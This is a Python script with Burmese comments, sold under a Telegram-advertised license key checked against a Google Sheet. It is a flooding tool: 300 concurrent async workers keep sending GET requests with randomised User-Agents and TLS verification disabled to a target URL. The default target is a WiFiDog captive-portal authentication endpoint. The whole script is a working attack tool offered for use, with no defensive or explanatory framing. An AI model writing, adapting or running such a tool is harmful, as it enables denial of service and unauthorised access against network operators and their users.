#!/usr/bin/env python3
import asyncio
import aiohttp
import requests
import random
import time
import os
import sys
import socket
from urllib.parse import urlparse

# ===============================
# ကိုယ်ပိုင် BRAND သတ်မှတ်ချက်များ
# ===============================
ADMIN_TELEGRAM = "@mgzan201"
CHANNEL_LINK = "https://t.me/starlinkvpnfile"
# သင့် Google Sheet ID (ဓာတ်ပုံ ၈ ထဲက ID)
SHEET_ID = "1mernkvpk07PuqSEfsdlDsiju6F5cd9Mex6NlerAECAk"
CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv"

# အရောင်များ
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
WHITE = "\033[0m"

# ===============================
# KEY SYSTEM
# ===============================
def get_system_key():
    """စက်ရဲ့ Unique Key ကို ထုတ်ပေးခြင်း"""
    try: uid = os.getuid()
    except: uid = 1000
    user = os.environ.get('USER', 'user')
    return f"{uid}{user}"

def check_approval():
    """Google Sheet ထဲမှာ Key ရှိမရှိ စစ်ဆေးခြင်း"""
    os.system('clear')
    display_banner()
    print(f"{CYAN}[*] Checking License: {get_system_key()}...{WHITE}")
    
    try:
        # Google Sheet ကို လှမ်းဖတ်ခြင်း
        response = requests.get(CSV_URL, timeout=10)
        if get_system_key() in response.text:
            print(f"{GREEN}[✓] Access Granted! Welcome to Mg Zan Pro.{WHITE}")
            time.sleep(1.5)
            return True
    except Exception as e:
        print(f"{YELLOW}[!] Connection Error. Please check internet.{WHITE}")
        return False
    
    # Key မရှိလျှင် ပြသမည့်စာသား
    print(f"{RED}╔══════════════════════════════════════════════╗")
    print(f"║             ❌ KEY NOT APPROVED              ║")
    print(f"╠══════════════════════════════════════════════╣")
    print(f"║  Your Key: {get_system_key()}       ║")
    print(f"║  Contact Admin: {ADMIN_TELEGRAM}                ║")
    print(f"║  Join Channel: {CHANNEL_LINK}    ║")
    print(f"╚══════════════════════════════════════════════╝{WHITE}")
    return False

# ===============================
# UI & BANNER
# ===============================
def display_banner():
    banner = f"""
{RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃{GREEN}   __  __  ____   _____             _   _     {RED}┃
┃{GREEN}  |  \/  |/ ___| |__  / __ _ _ __  | | | |    {RED}┃
┃{GREEN}  | |\/| | |  _    / / / _` | '_ \ | | | |    {RED}┃
┃{GREEN}  | |  | | |_| |  / /_| (_| | | | || |_| |    {RED}┃
┃{GREEN}  |_|  |_|\____| /____|\__,_|_| |_| \___/     {RED}┃
┃{CYAN}         >> PREMIUM NETWORK ENGINE <<         {RED}┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{WHITE}
    """
    print(banner)

# ===============================
# CORE ENGINE (ASYNCHRONOUS)
# ===============================
class MgZanEngine:
    def __init__(self, target_url):
        self.target_url = target_url
        self.success = 0
        self.fail = 0
        self.is_running = True

    async def worker(self, session):
        while self.is_running:
            try:
                headers = {
                    "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(1,999)}",
                    "Connection": "keep-alive"
                }
                async with session.get(self.target_url, headers=headers, timeout=5) as res:
                    if res.status == 200:
                        self.success += 1
                    else:
                        self.fail += 1
            except:
                self.fail += 1
            
            # အရှိန်ကို ချိန်ညှိရန် (0.01 သည် အမြန်ဆုံးဖြစ်သည်)
            await asyncio.sleep(0.01)

    async def monitor(self):
        start_time = time.time()
        while self.is_running:
            await asyncio.sleep(1)
            total = self.success + self.fail
            if total > 0:
                elapsed = time.time() - start_time
                rps = total / elapsed
                print(f"\r🚀 {CYAN}Speed: {rps:.2f} r/s | {GREEN}Success: {self.success} | {RED}Fail: {self.fail}{WHITE}", end="")

    async def run(self):
        connector = aiohttp.TCPConnector(limit=0, family=socket.AF_INET, verify_ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Task ပေါင်း ၃၀၀ ဖြင့် တစ်ပြိုင်တည်း မောင်းမည်
            tasks = [asyncio.create_task(self.worker(session)) for _ in range(300)]
            tasks.append(asyncio.create_task(self.monitor()))
            await asyncio.gather(*tasks)

# ===============================
# MAIN START
# ===============================
if __name__ == "__main__":
    # ၁။ Key အရင်စစ်မည်
    if check_approval():
        # ၂။ Key အောင်မြင်လျှင် Target URL ကို မေးမည်
        print(f"\n{YELLOW}[*] Enter Portal Auth URL (or use default):{WHITE}")
        target = input(f"{CYAN}>> {WHITE}").strip()
        
        if not target:
            target = "http://192.168.60.1:2060/wifidog/auth?token=MGZAN_TEST"
            
        print(f"\n{GREEN}[+] Engine Starting... Pulse active!{WHITE}")
        engine = MgZanEngine(target)
        try:
            asyncio.run(engine.run())
        except KeyboardInterrupt:
            engine.is_running = False
            print(f"\n{RED}[!] Tool Stopped by User.{WHITE}")
